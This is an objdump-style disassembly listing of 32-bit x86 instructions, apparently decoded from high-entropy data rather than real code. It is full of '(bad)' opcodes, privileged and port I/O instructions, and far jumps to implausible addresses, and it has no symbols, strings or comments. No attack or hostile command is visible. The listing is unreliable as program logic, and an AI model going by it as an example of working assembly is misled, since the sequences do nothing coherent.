  42106d:	41                   	inc    %ecx
  42106e:	ad                   	lods   %ds:(%esi),%eax
  42106f:	75 33                	jne    0x4210a4
  421071:	f0 d1 b6 f9 07 fd dd 	lock shll $1,-0x2202f807(%esi)
  421078:	fa                   	cli
  421079:	cd d1                	int    $0xd1
  42107b:	f7 43 23 c0 00 a9 53 	testl  $0x53a900c0,0x23(%ebx)
  421082:	5c                   	pop    %esp
  421083:	ea 2b 67 c5 b2 a0 32 	ljmp   $0x32a0,$0xb2c5672b
  42108a:	87 2c d6             	xchg   %ebp,(%esi,%edx,8)
  42108d:	ac                   	lods   %ds:(%esi),%al
  42108e:	af                   	scas   %es:(%edi),%eax
  42108f:	3c 91                	cmp    $0x91,%al
  421091:	bd 70 8a 7b e5       	mov    $0xe57b8a70,%ebp
  421096:	82 eb 69             	sub    $0x69,%bl
  421099:	56                   	push   %esi
  42109a:	dd 7b 5d             	fnstsw 0x5d(%ebx)
  42109d:	51                   	push   %ecx
  42109e:	88 28                	mov    %ch,(%eax)
  4210a0:	2f                   	das
  4210a1:	ca cd 82             	lret   $0x82cd
  4210a4:	27                   	daa
  4210a5:	9e                   	sahf
  4210a6:	cc                   	int3
  4210a7:	0a c9                	or     %cl,%cl
  4210a9:	cf                   	iret
  4210aa:	d7                   	xlat   %ds:(%ebx)
  4210ab:	74 a7                	je     0x421054
  4210ad:	5f                   	pop    %edi
  4210ae:	9c                   	pushf
  4210af:	1e                   	push   %ds
  4210b0:	44                   	inc    %esp
  4210b1:	76 05                	jbe    0x4210b8
  4210b3:	ab                   	stos   %eax,%es:(%edi)
  4210b4:	9a 0d 85 f9 99 da a0 	lcall  $0xa0da,$0x99f9850d
  4210bb:	7f 51                	jg     0x42110e
  4210bd:	3d b2 10 ed 08       	cmp    $0x8ed10b2,%eax
  4210c2:	f5                   	cmc
  4210c3:	f5                   	cmc
  4210c4:	12 8a 8b 4d f8 6e    	adc    0x6ef84d8b(%edx),%cl
  4210ca:	30 7e e6             	xor    %bh,-0x1a(%esi)
  4210cd:	e6 2f                	out    %al,$0x2f
  4210cf:	db d9                	fcmovnu %st(1),%st
  4210d1:	5d                   	pop    %ebp
  4210d2:	e1 a0                	loope  0x421074
  4210d4:	ca fd 01             	lret   $0x1fd
  4210d7:	3d 41 1b 04 4e       	cmp    $0x4e041b41,%eax
  4210dc:	e5 8a                	in     $0x8a,%eax
  4210de:	3b b1 51 6b f9 ca    	cmp    -0x350694af(%ecx),%esi
  4210e4:	77 f2                	ja     0x4210d8
  4210e6:	aa                   	stos   %al,%es:(%edi)
  4210e7:	56                   	push   %esi
  4210e8:	34 d2                	xor    $0xd2,%al
  4210ea:	eb 92                	jmp    0x42107e
  4210ec:	e5 5b                	in     $0x5b,%eax
  4210ee:	fe                   	(bad)
  4210ef:	21 59 06             	and    %ebx,0x6(%ecx)
  4210f2:	20 75 1a             	and    %dh,0x1a(%ebp)
  4210f5:	fd                   	std
  4210f6:	42                   	inc    %edx
  4210f7:	5e                   	pop    %esi
  4210f8:	46                   	inc    %esi
  4210f9:	ce                   	into
  4210fa:	c6                   	(bad)
  4210fb:	55                   	push   %ebp
  4210fc:	2f                   	das
  4210fd:	fd                   	std
  4210fe:	16                   	push   %ss
  4210ff:	d3 65 10             	shll   %cl,0x10(%ebp)
  421102:	52                   	push   %edx
  421103:	68 f1 c8 2f 05       	push   $0x52fc8f1
  421108:	75 1e                	jne    0x421128
  42110a:	6d                   	insl   (%dx),%es:(%edi)
  42110b:	fc                   	cld
  42110c:	37                   	aaa
  42110d:	87 6b 43             	xchg   %ebp,0x43(%ebx)
  421110:	da 41 90             	fiaddl -0x70(%ecx)
  421113:	50                   	push   %eax
  421114:	ed                   	in     (%dx),%eax
  421115:	d0 26                	shlb   $1,(%esi)
  421117:	5d                   	pop    %ebp
  421118:	fa                   	cli
  421119:	b3 20                	mov    $0x20,%bl
  42111b:	1e                   	push   %ds
  42111c:	3f                   	aas
  42111d:	30 d2                	xor    %dl,%dl
  42111f:	18 a8 eb 0a f8 f0    	sbb    %ch,-0xf07f515(%eax)
  421125:	ab                   	stos   %eax,%es:(%edi)
  421126:	74 17                	je     0x42113f
  421128:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421129:	ea 75 01 1c 2e 50 d7 	ljmp   $0xd750,$0x2e1c0175
  421130:	cd 26                	int    $0x26
  421132:	71 a7                	jno    0x4210db
  421134:	a2 f8 d3 4c 58       	mov    %al,0x584cd3f8
  421139:	e8 36 e3 8c be       	call   0xbecef474
  42113e:	57                   	push   %edi
  42113f:	d0 cc                	ror    $1,%ah
  421141:	56                   	push   %esi
  421142:	bb b5 62 05 36       	mov    $0x360562b5,%ebx
  421147:	49                   	dec    %ecx
  421148:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421149:	0d b8 3d 66 c9       	or     $0xc9663db8,%eax
  42114e:	6a cb                	push   $0xffffffcb
  421150:	61                   	popa
  421151:	0f e1 c8             	psraw  %mm0,%mm1
  421154:	93                   	xchg   %eax,%ebx
  421155:	8e a4 5f 41 59 fc 8d 	mov    -0x7203a6bf(%edi,%ebx,2),%fs
  42115c:	bf 63 bc 67 81       	mov    $0x8167bc63,%edi
  421161:	48                   	dec    %eax
  421162:	2c 8b                	sub    $0x8b,%al
  421164:	6d                   	insl   (%dx),%es:(%edi)
  421165:	6c                   	insb   (%dx),%es:(%edi)
  421166:	18 05 bc 1c ad c1    	sbb    %al,0xc1ad1cbc
  42116c:	b6 1f                	mov    $0x1f,%dh
  42116e:	b8 a5 d8 76 31       	mov    $0x3176d8a5,%eax
  421173:	fa                   	cli
  421174:	ca e9 13             	lret   $0x13e9
  421177:	50                   	push   %eax
  421178:	8c 60 56             	mov    %fs,0x56(%eax)
  42117b:	d9 34 d3             	fnstenv (%ebx,%edx,8)
  42117e:	b5 23                	mov    $0x23,%ch
  421180:	00 d3                	add    %dl,%bl
  421182:	ce                   	into
  421183:	a1 13 f8 da fb       	mov    0xfbdaf813,%eax
  421188:	74 11                	je     0x42119b
  42118a:	94                   	xchg   %eax,%esp
  42118b:	4e                   	dec    %esi
  42118c:	b4 f6                	mov    $0xf6,%ah
  42118e:	dd d4                	fst    %st(4)
  421190:	03 8b 87 67 43 57    	add    0x57436787(%ebx),%ecx
  421196:	a0 93 55 c5 0e       	mov    0xec55593,%al
  42119b:	cd 51                	int    $0x51
  42119d:	ae                   	scas   %es:(%edi),%al
  42119e:	d6                   	salc
  42119f:	6b db 93             	imul   $0xffffff93,%ebx,%ebx
  4211a2:	e1 dd                	loope  0x421181
  4211a4:	82 bd 1a 53 0d 94 16 	cmpb   $0x16,-0x6bf2ace6(%ebp)
  4211ab:	2b ab 8d be 7a d0    	sub    -0x2f854173(%ebx),%ebp
  4211b1:	ed                   	in     (%dx),%eax
  4211b2:	23 70 61             	and    0x61(%eax),%esi
  4211b5:	d0 51 03             	rclb   $1,0x3(%ecx)
  4211b8:	ff 02                	incl   (%edx)
  4211ba:	91                   	xchg   %eax,%ecx
  4211bb:	15 63 b4 6d 12       	adc    $0x126db463,%eax
  4211c0:	f8                   	clc
  4211c1:	99                   	cltd
  4211c2:	31 1e                	xor    %ebx,(%esi)
  4211c4:	3e 42                	ds inc %edx
  4211c6:	61                   	popa
  4211c7:	7c 47                	jl     0x421210
  4211c9:	c6                   	(bad)
  4211ca:	b3 83                	mov    $0x83,%bl
  4211cc:	47                   	inc    %edi
  4211cd:	55                   	push   %ebp
  4211ce:	5a                   	pop    %edx
  4211cf:	51                   	push   %ecx
  4211d0:	4b                   	dec    %ebx
  4211d1:	0f 87 18 d1 72 1e    	ja     0x1eb4e2ef
  4211d7:	1d e5 fe 3e c1       	sbb    $0xc13efee5,%eax
  4211dc:	ca 54 17             	lret   $0x1754
  4211df:	d6                   	salc
  4211e0:	2e 1a 34 68          	sbb    %cs:(%eax,%ebp,2),%dh
  4211e4:	6d                   	insl   (%dx),%es:(%edi)
  4211e5:	5b                   	pop    %ebx
  4211e6:	d8 43 e4             	fadds  -0x1c(%ebx)
  4211e9:	af                   	scas   %es:(%edi),%eax
  4211ea:	2d 16 53 a2 d6       	sub    $0xd6a25316,%eax
  4211ef:	29 4b bf             	sub    %ecx,-0x41(%ebx)
  4211f2:	32 dc                	xor    %ah,%bl
  4211f4:	92                   	xchg   %eax,%edx
  4211f5:	3c 42                	cmp    $0x42,%al
  4211f7:	ce                   	into
  4211f8:	eb e6                	jmp    0x4211e0
  4211fa:	16                   	push   %ss
  4211fb:	ae                   	scas   %es:(%edi),%al
  4211fc:	13 b1 87 18 38 f8    	adc    -0x7c7e779(%ecx),%esi
  421202:	c3                   	ret
  421203:	4a                   	dec    %edx
  421204:	c3                   	ret
  421205:	b8 6e 1c 6f 07       	mov    $0x76f1c6e,%eax
  42120a:	e1 90                	loope  0x42119c
  42120c:	27                   	daa
  42120d:	6e                   	outsb  %ds:(%esi),(%dx)
  42120e:	85 c0                	test   %eax,%eax
  421210:	c9                   	leave
  421211:	37                   	aaa
  421212:	63 9b 91 83 07 ca    	arpl   %ebx,-0x35f87c6f(%ebx)
  421218:	9e                   	sahf
  421219:	3b 89 46 15 ad e5    	cmp    -0x1a52eaba(%ecx),%ecx
  42121f:	bd 15 18 c2 4f       	mov    $0x4fc21815,%ebp
  421224:	a9 f8 f6 d6 ef       	test   $0xefd6f6f8,%eax
  421229:	a1 f8 ab 55 22       	mov    0x2255abf8,%eax
  42122e:	4a                   	dec    %edx
  42122f:	bc 59 e3 e5 35       	mov    $0x35e5e359,%esp
  421234:	5d                   	pop    %ebp
  421235:	bd 48 c4 1d 37       	mov    $0x371dc448,%ebp
  42123a:	8e 65 1c             	mov    0x1c(%ebp),%fs
  42123d:	70 96                	jo     0x4211d5
  42123f:	b3 12                	mov    $0x12,%bl
  421241:	51                   	push   %ecx
  421242:	0c f5                	or     $0xf5,%al
  421244:	13 4c be 49          	adc    0x49(%esi,%edi,4),%ecx
  421248:	ed                   	in     (%dx),%eax
  421249:	42                   	inc    %edx
  42124a:	3d 97 de aa 3d       	cmp    $0x3daade97,%eax
  42124f:	7d 2b                	jge    0x42127c
  421251:	69 9e 2a d9 f5 73 81 	imul   $0xb23da781,0x73f5d92a(%esi),%ebx
  421258:	a7 3d b2 
  42125b:	c2 bd d3             	ret    $0xd3bd
  42125e:	ed                   	in     (%dx),%eax
  42125f:	e1 fc                	loope  0x42125d
  421261:	bf 31 cd ca 6b       	mov    $0x6bcacd31,%edi
  421266:	33 d1                	xor    %ecx,%edx
  421268:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  421269:	16                   	push   %ss
  42126a:	2c ef                	sub    $0xef,%al
  42126c:	ce                   	into
  42126d:	0b fc                	or     %esp,%edi
  42126f:	23 53 22             	and    0x22(%ebx),%edx
  421272:	1e                   	push   %ds
  421273:	af                   	scas   %es:(%edi),%eax
  421274:	82 c7 1a             	add    $0x1a,%bh
  421277:	5a                   	pop    %edx
  421278:	78 0d                	js     0x421287
  42127a:	12 b4 87 46 ad ab 84 	adc    -0x7b5452ba(%edi,%eax,4),%dh
  421281:	c6                   	(bad)
  421282:	b4 15                	mov    $0x15,%ah
  421284:	13 aa 2b f0 27 72    	adc    0x7227f02b(%edx),%ebp
  42128a:	88 c5                	mov    %al,%ch
  42128c:	61                   	popa
  42128d:	23 67 eb             	and    -0x15(%edi),%esp
  421290:	0a 98 22 e6 bb 9a    	or     -0x654419de(%eax),%bl
  421296:	d2 f4                	shl    %cl,%ah
  421298:	de 89 67 7a d1 67    	fimuls 0x67d17a67(%ecx)
  42129e:	de 5d d2             	ficomps -0x2e(%ebp)
  4212a1:	c9                   	leave
  4212a2:	6a f8                	push   $0xfffffff8
  4212a4:	9a 67 c6 a2 e4 b3 d9 	lcall  $0xd9b3,$0xe4a2c667
  4212ab:	3c e7                	cmp    $0xe7,%al
  4212ad:	f4                   	hlt
  4212ae:	db e8                	fucomi %st(0),%st
  4212b0:	74 42                	je     0x4212f4
  4212b2:	1e                   	push   %ds
  4212b3:	80 0f 6b             	orb    $0x6b,(%edi)
  4212b6:	c2 e9 16             	ret    $0x16e9
  4212b9:	a1 e6 89 6d 60       	mov    0x606d89e6,%eax
  4212be:	d5 7b                	aad    $0x7b
  4212c0:	c0 26 bf             	shlb   $0xbf,(%esi)
  4212c3:	56                   	push   %esi
  4212c4:	7f 2f                	jg     0x4212f5
  4212c6:	a1 c9 b3 35 38       	mov    0x3835b3c9,%eax
  4212cb:	22 f9                	and    %cl,%bh
  4212cd:	33 e2                	xor    %edx,%esp
  4212cf:	c9                   	leave
  4212d0:	79 82                	jns    0x421254
  4212d2:	5a                   	pop    %edx
  4212d3:	d6                   	salc
  4212d4:	3e f8                	ds clc
  4212d6:	c2 23 66             	ret    $0x6623
  4212d9:	18 08                	sbb    %cl,(%eax)
  4212db:	9d                   	popf
  4212dc:	2f                   	das
  4212dd:	d9 bf 42 0c 3c e1    	fnstcw -0x1ec3f3be(%edi)
  4212e3:	4f                   	dec    %edi
  4212e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4212e5:	5a                   	pop    %edx
  4212e6:	aa                   	stos   %al,%es:(%edi)
  4212e7:	90                   	nop
  4212e8:	99                   	cltd
  4212e9:	ac                   	lods   %ds:(%esi),%al
  4212ea:	e1 e5                	loope  0x4212d1
  4212ec:	7c 1a                	jl     0x421308
  4212ee:	23 05 39 c3 d0 1e    	and    0x1ed0c339,%eax
  4212f4:	93                   	xchg   %eax,%ebx
  4212f5:	f7 36                	divl   (%esi)
  4212f7:	dc ad 94 1b 5b cb    	fsubrl -0x34a4e46c(%ebp)
  4212fd:	74 2a                	je     0x421329
  4212ff:	b6 80                	mov    $0x80,%dh
  421301:	f5                   	cmc
  421302:	f9                   	stc
  421303:	81 fb 95 19 40 97    	cmp    $0x97401995,%ebx
  421309:	32 99 91 aa d1 9e    	xor    -0x612e556f(%ecx),%bl
  42130f:	43                   	inc    %ebx
  421310:	0d d4 31 0c ce       	or     $0xce0c31d4,%eax
  421315:	e2 42                	loop   0x421359
  421317:	48                   	dec    %eax
  421318:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421319:	48                   	dec    %eax
  42131a:	f0 23 53 74          	lock and 0x74(%ebx),%edx
  42131e:	cb                   	lret
  42131f:	d1 fa                	sar    $1,%edx
  421321:	af                   	scas   %es:(%edi),%eax
  421322:	86 e6                	xchg   %ah,%dh
  421324:	c0 c8 ed             	ror    $0xed,%al
  421327:	01 25 ef 46 3a 6d    	add    %esp,0x6d3a46ef
  42132d:	b2 9b                	mov    $0x9b,%dl
  42132f:	3b be 4b 5d f8 9a    	cmp    -0x6507a2b5(%esi),%edi
  421335:	d8 25 b5 74 b0 04    	fsubs  0x4b074b5
  42133b:	0e                   	push   %cs
  42133c:	27                   	daa
  42133d:	7d 74                	jge    0x4213b3
  42133f:	5f                   	pop    %edi
  421340:	93                   	xchg   %eax,%ebx
  421341:	59                   	pop    %ecx
  421342:	bb fa 63 76 46       	mov    $0x467663fa,%ebx
  421347:	37                   	aaa
  421348:	40                   	inc    %eax
  421349:	4a                   	dec    %edx
  42134a:	dc 8f b2 2e 00 b9    	fmull  -0x46ffd14e(%edi)
  421350:	68 80 4e 74 5a       	push   $0x5a744e80
  421355:	16                   	push   %ss
  421356:	74 e8                	je     0x421340
  421358:	6e                   	outsb  %ds:(%esi),(%dx)
  421359:	66 94                	xchg   %ax,%sp
  42135b:	66 bf c4 4d          	mov    $0x4dc4,%di
  42135f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421360:	68 a6 88 22 5f       	push   $0x5f2288a6
  421365:	44                   	inc    %esp
  421366:	f1                   	int1
  421367:	d9 e7                	(bad)
  421369:	a8 f9                	test   $0xf9,%al
  42136b:	76 77                	jbe    0x4213e4
  42136d:	f4                   	hlt
  42136e:	3e 33 10             	xor    %ds:(%eax),%edx
  421371:	c5 52 ce             	lds    -0x32(%edx),%edx
  421374:	74 6b                	je     0x4213e1
  421376:	62 4f 9e             	bound  %ecx,-0x62(%edi)
  421379:	01 10                	add    %edx,(%eax)
  42137b:	84 a4 57 ca 99 43 f2 	test   %ah,-0xdbc6636(%edi,%edx,2)
  421382:	68 c8 5e fa b5       	push   $0xb5fa5ec8
  421387:	29 c1                	sub    %eax,%ecx
  421389:	f6 4e 52 92          	testb  $0x92,0x52(%esi)
  42138d:	63 1b                	arpl   %ebx,(%ebx)
  42138f:	76 ac                	jbe    0x42133d
  421391:	4a                   	dec    %edx
  421392:	35 59 3e ad a7       	xor    $0xa7ad3e59,%eax
  421397:	81 08 9e 36 57 96    	orl    $0x9657369e,(%eax)
  42139d:	f8                   	clc
  42139e:	95                   	xchg   %eax,%ebp
  42139f:	42                   	inc    %edx
  4213a0:	80 56 e8 f2          	adcb   $0xf2,-0x18(%esi)
  4213a4:	be a5 92 b4 f3       	mov    $0xf3b492a5,%esi
  4213a9:	28 a7 7e 67 17 e2    	sub    %ah,-0x1de89882(%edi)
  4213af:	73 30                	jae    0x4213e1
  4213b1:	3c b3                	cmp    $0xb3,%al
  4213b3:	74 27                	je     0x4213dc
  4213b5:	63 13                	arpl   %edx,(%ebx)
  4213b7:	71 d7                	jno    0x421390
  4213b9:	1e                   	push   %ds
  4213ba:	5f                   	pop    %edi
  4213bb:	8e 07                	mov    (%edi),%es
  4213bd:	d0 62 c0             	shlb   $1,-0x40(%edx)
  4213c0:	e1 25                	loope  0x4213e7
  4213c2:	18 64 f2 b7          	sbb    %ah,-0x49(%edx,%esi,8)
  4213c6:	95                   	xchg   %eax,%ebp
  4213c7:	77 a4                	ja     0x42136d
  4213c9:	7f 70                	jg     0x42143b
  4213cb:	29 b5 db 6d 81 e5    	sub    %esi,-0x1a7e9225(%ebp)
  4213d1:	49                   	dec    %ecx
  4213d2:	99                   	cltd
  4213d3:	9c                   	pushf
  4213d4:	1c e5                	sbb    $0xe5,%al
  4213d6:	9f                   	lahf
  4213d7:	0d d9 bc 3e 9a       	or     $0x9a3ebcd9,%eax
  4213dc:	2b d1                	sub    %ecx,%edx
  4213de:	f8                   	clc
  4213df:	98                   	cwtl
  4213e0:	fe                   	(bad)
  4213e1:	75 89                	jne    0x42136c
  4213e3:	77 5f                	ja     0x421444
  4213e5:	1e                   	push   %ds
  4213e6:	17                   	pop    %ss
  4213e7:	23 b4 9c cd a8 a6 e6 	and    -0x19595733(%esp,%ebx,4),%esi
  4213ee:	f4                   	hlt
  4213ef:	b2 99                	mov    $0x99,%dl
  4213f1:	5e                   	pop    %esi
  4213f2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4213f3:	bb b1 14 84 de       	mov    $0xde8414b1,%ebx
  4213f8:	ae                   	scas   %es:(%edi),%al
  4213f9:	d2 ed                	shr    %cl,%ch
  4213fb:	0c 41                	or     $0x41,%al
  4213fd:	cd 0c                	int    $0xc
  4213ff:	e8 34 41 a8 25       	call   0x25ea5538
  421404:	a1 a5 ad f1 2b       	mov    0x2bf1ada5,%eax
  421409:	9f                   	lahf
  42140a:	d6                   	salc
  42140b:	65 ee                	gs out %al,(%dx)
  42140d:	e6 9e                	out    %al,$0x9e
  42140f:	d2 9b c2 ad ec 7d    	rcrb   %cl,0x7decadc2(%ebx)
  421415:	6a 3c                	push   $0x3c
  421417:	7f 41                	jg     0x42145a
  421419:	6d                   	insl   (%dx),%es:(%edi)
  42141a:	94                   	xchg   %eax,%esp
  42141b:	fe                   	(bad)
  42141c:	ad                   	lods   %ds:(%esi),%eax
  42141d:	cf                   	iret
  42141e:	93                   	xchg   %eax,%ebx
  42141f:	31 0f                	xor    %ecx,(%edi)
  421421:	28 3b                	sub    %bh,(%ebx)
  421423:	b2 8d                	mov    $0x8d,%dl
  421425:	f6 28                	imulb  (%eax)
  421427:	76 55                	jbe    0x42147e
  421429:	60                   	pusha
  42142a:	dc 0c ab             	fmull  (%ebx,%ebp,4)
  42142d:	21 c2                	and    %eax,%edx
  42142f:	21 2a                	and    %ebp,(%edx)
  421431:	ea c4 a9 ae e6 e8 cf 	ljmp   $0xcfe8,$0xe6aea9c4
  421438:	42                   	inc    %edx
  421439:	b2 84                	mov    $0x84,%dl
  42143b:	98                   	cwtl
  42143c:	63 44 2e f9          	arpl   %eax,-0x7(%esi,%ebp,1)
  421440:	20 e2                	and    %ah,%dl
  421442:	38 e0                	cmp    %ah,%al
  421444:	1b 26                	sbb    (%esi),%esp
  421446:	cb                   	lret
  421447:	af                   	scas   %es:(%edi),%eax
  421448:	91                   	xchg   %eax,%ecx
  421449:	2f                   	das
  42144a:	0c 5e                	or     $0x5e,%al
  42144c:	c5 99 ea 1a d4 b5    	lds    -0x4a2be516(%ecx),%ebx
  421452:	c2 ac eb             	ret    $0xebac
  421455:	db 63 92             	(bad) -0x6e(%ebx)
  421458:	8e a4 07 60 eb d0 fb 	mov    -0x42f14a0(%edi,%eax,1),%fs
  42145f:	6e                   	outsb  %ds:(%esi),(%dx)
  421460:	58                   	pop    %eax
  421461:	97                   	xchg   %eax,%edi
  421462:	dc 3c e1             	fdivrl (%ecx,%eiz,8)
  421465:	2a 2a                	sub    (%edx),%ch
  421467:	4f                   	dec    %edi
  421468:	ac                   	lods   %ds:(%esi),%al
  421469:	ac                   	lods   %ds:(%esi),%al
  42146a:	2c 64                	sub    $0x64,%al
  42146c:	56                   	push   %esi
  42146d:	98                   	cwtl
  42146e:	ce                   	into
  42146f:	ce                   	into
  421470:	90                   	nop
  421471:	29 9f 0c 77 54 f0    	sub    %ebx,-0xfab88f4(%edi)
  421477:	96                   	xchg   %eax,%esi
  421478:	59                   	pop    %ecx
  421479:	91                   	xchg   %eax,%ecx
  42147a:	b0 6f                	mov    $0x6f,%al
  42147c:	23 07                	and    (%edi),%eax
  42147e:	62 21                	bound  %esp,(%ecx)
  421480:	83 d2 bc             	adc    $0xffffffbc,%edx
  421483:	fe 49 ca             	decb   -0x36(%ecx)
  421486:	69 91 b4 c9 54 a6 15 	imul   $0xe89d8d15,-0x59ab364c(%ecx),%edx
  42148d:	8d 9d e8 
  421490:	85 00                	test   %eax,(%eax)
  421492:	80 58 d3 d8          	sbbb   $0xd8,-0x2d(%eax)
  421496:	48                   	dec    %eax
  421497:	2b 15 36 4e 7d 9b    	sub    0x9b7d4e36,%edx
  42149d:	12 7c ce b9          	adc    -0x47(%esi,%ecx,8),%bh
  4214a1:	96                   	xchg   %eax,%esi
  4214a2:	83 14 a1 90          	adcl   $0xffffff90,(%ecx,%eiz,4)
  4214a6:	3a 01                	cmp    (%ecx),%al
  4214a8:	77 a9                	ja     0x421453
  4214aa:	d2 b5 23 8b 10 aa    	shlb   %cl,-0x55ef74dd(%ebp)
  4214b0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4214b1:	da 91 76 2d d0 65    	ficoml 0x65d02d76(%ecx)
  4214b7:	62 be cc 93 30 c7    	bound  %edi,-0x38cf6c34(%esi)
  4214bd:	84 09                	test   %cl,(%ecx)
  4214bf:	7b 97                	jnp    0x421458
  4214c1:	fc                   	cld
  4214c2:	e4 3b                	in     $0x3b,%al
  4214c4:	03 18                	add    (%eax),%ebx
  4214c6:	cb                   	lret
  4214c7:	30 0f                	xor    %cl,(%edi)
  4214c9:	12 1c 49             	adc    (%ecx,%ecx,2),%bl
  4214cc:	67 4a                	addr16 dec %edx
  4214ce:	0c 27                	or     $0x27,%al
  4214d0:	05 c2 ac ef 9b       	add    $0x9befacc2,%eax
  4214d5:	44                   	inc    %esp
  4214d6:	da d3                	fcmovbe %st(3),%st
  4214d8:	87 80 a5 00 7d af    	xchg   %eax,-0x5082ff5b(%eax)
  4214de:	5f                   	pop    %edi
  4214df:	d3 b6 c4 69 14 61    	shll   %cl,0x611469c4(%esi)
  4214e5:	32 38                	xor    (%eax),%bh
  4214e7:	22 5d d2             	and    -0x2e(%ebp),%bl
  4214ea:	b9 d4 54 a8 9e       	mov    $0x9ea854d4,%ecx
  4214ef:	56                   	push   %esi
  4214f0:	b8 61 41 e2 51       	mov    $0x51e24161,%eax
  4214f5:	cf                   	iret
  4214f6:	c3                   	ret
  4214f7:	70 5b                	jo     0x421554
  4214f9:	ac                   	lods   %ds:(%esi),%al
  4214fa:	1a f7                	sbb    %bh,%dh
  4214fc:	8b c8                	mov    %eax,%ecx
  4214fe:	26 dd b3 c7 7a 02 5c 	fnsave %es:0x5c027ac7(%ebx)
  421505:	e8 7f 12 07 41       	call   0x41492789
  42150a:	1c 51                	sbb    $0x51,%al
  42150c:	77 63                	ja     0x421571
  42150e:	4f                   	dec    %edi
  42150f:	f1                   	int1
  421510:	c0 7d 7f de          	sarb   $0xde,0x7f(%ebp)
  421514:	bb c8 db 9f 6f       	mov    $0x6f9fdbc8,%ebx
  421519:	c4 46 34             	les    0x34(%esi),%eax
  42151c:	51                   	push   %ecx
  42151d:	1e                   	push   %ds
  42151e:	6c                   	insb   (%dx),%es:(%edi)
  42151f:	cc                   	int3
  421520:	69 74 71 15 03 d1 4b 	imul   $0x114bd103,0x15(%ecx,%esi,2),%esi
  421527:	11 
  421528:	74 65                	je     0x42158f
  42152a:	81 95 1e 00 80 33 c1 	adcl   $0x2bef36c1,0x3380001e(%ebp)
  421531:	36 ef 2b 
  421534:	13 90 ba 84 8f 96    	adc    -0x69707b46(%eax),%edx
  42153a:	38 3b                	cmp    %bh,(%ebx)
  42153c:	8a 42 a6             	mov    -0x5a(%edx),%al
  42153f:	5a                   	pop    %edx
  421540:	ab                   	stos   %eax,%es:(%edi)
  421541:	7e 3d                	jle    0x421580
  421543:	eb d3                	jmp    0x421518
  421545:	4e                   	dec    %esi
  421546:	e6 56                	out    %al,$0x56
  421548:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421549:	0e                   	push   %cs
  42154a:	1c 4b                	sbb    $0x4b,%al
  42154c:	26 c0 fa 64          	es sar $0x64,%dl
  421550:	68 2a a0 6f 55       	push   $0x556fa02a
  421555:	eb 58                	jmp    0x4215af
  421557:	fe                   	(bad)
  421558:	3c 81                	cmp    $0x81,%al
  42155a:	b7 dd                	mov    $0xdd,%bh
  42155c:	4f                   	dec    %edi
  42155d:	5e                   	pop    %esi
  42155e:	f5                   	cmc
  42155f:	a1 70 c6 49 19       	mov    0x1949c670,%eax
  421564:	13 ad e6 61 77 d7    	adc    -0x28889e1a(%ebp),%ebp
  42156a:	b0 d3                	mov    $0xd3,%al
  42156c:	37                   	aaa
  42156d:	73 bf                	jae    0x42152e
  42156f:	dd 64 1c 4d          	frstor 0x4d(%esp,%ebx,1)
  421573:	4f                   	dec    %edi
  421574:	a2 e4 a7 9d 68       	mov    %al,0x689da7e4
  421579:	ba fb 1a 0c 8b       	mov    $0x8b0c1afb,%edx
  42157e:	15 62 6a 0d fb       	adc    $0xfb0d6a62,%eax
  421583:	69 39 10 03 73 a7    	imul   $0xa7730310,(%ecx),%edi
  421589:	0e                   	push   %cs
  42158a:	62 46 d2             	bound  %eax,-0x2e(%esi)
  42158d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42158e:	17                   	pop    %ss
  42158f:	9f                   	lahf
  421590:	8d 44 38 5d          	lea    0x5d(%eax,%edi,1),%eax
  421594:	b9 1f de a6 98       	mov    $0x98a6de1f,%ecx
  421599:	02 95 3a 3b d6 67    	add    0x67d63b3a(%ebp),%dl
  42159f:	14 24                	adc    $0x24,%al
  4215a1:	6d                   	insl   (%dx),%es:(%edi)
  4215a2:	dc 0b                	fmull  (%ebx)
  4215a4:	12 9b db 32 30 57    	adc    0x573032db(%ebx),%bl
  4215aa:	ff                   	(bad)
  4215ab:	3f                   	aas
  4215ac:	e6 7d                	out    %al,$0x7d
  4215ae:	a3 aa b8 43 51       	mov    %eax,0x5143b8aa
  4215b3:	80 19 44             	sbbb   $0x44,(%ecx)
  4215b6:	c9                   	leave
  4215b7:	52                   	push   %edx
  4215b8:	99                   	cltd
  4215b9:	5d                   	pop    %ebp
  4215ba:	e8 86 8a 7f b9       	call   0xb9c1a045
  4215bf:	fe 07                	incb   (%edi)
  4215c1:	8e 57 3a             	mov    0x3a(%edi),%ss
  4215c4:	87 58 60             	xchg   %ebx,0x60(%eax)
  4215c7:	a3 f6 0e b4 0f       	mov    %eax,0xfb40ef6
  4215cc:	5a                   	pop    %edx
  4215cd:	34 e6                	xor    $0xe6,%al
  4215cf:	f2 62 4c 64 d0       	repnz bound %ecx,-0x30(%esp,%eiz,2)
  4215d4:	78 2e                	js     0x421604
  4215d6:	5a                   	pop    %edx
  4215d7:	09 fa                	or     %edi,%edx
  4215d9:	01 c8                	add    %ecx,%eax
  4215db:	0d 9c 10 d4 60       	or     $0x60d4109c,%eax
  4215e0:	ed                   	in     (%dx),%eax
  4215e1:	08 87 5d 3a 88 e6    	or     %al,-0x1977c5a3(%edi)
  4215e7:	ac                   	lods   %ds:(%esi),%al
  4215e8:	6c                   	insb   (%dx),%es:(%edi)
  4215e9:	9a ac a0 a4 ba 7f 7a 	lcall  $0x7a7f,$0xbaa4a0ac
  4215f0:	04 37                	add    $0x37,%al
  4215f2:	9a 92 8b 6f c2 81 8f 	lcall  $0x8f81,$0xc26f8b92
  4215f9:	38 36                	cmp    %dh,(%esi)
  4215fb:	2a 6f 9c             	sub    -0x64(%edi),%ch
  4215fe:	1a 5e 64             	sbb    0x64(%esi),%bl
  421601:	e6 77                	out    %al,$0x77
  421603:	9a 3a d3 4c 31 d3 de 	lcall  $0xded3,$0x314cd33a
  42160a:	6f                   	outsl  %ds:(%esi),(%dx)
  42160b:	8c d6                	mov    %ss,%esi
  42160d:	f4                   	hlt
  42160e:	66 34 23             	data16 xor $0x23,%al
  421611:	66 42                	inc    %dx
  421613:	53                   	push   %ebx
  421614:	0b 37                	or     (%edi),%esi
  421616:	68 01 f9 d0 77       	push   $0x77d0f901
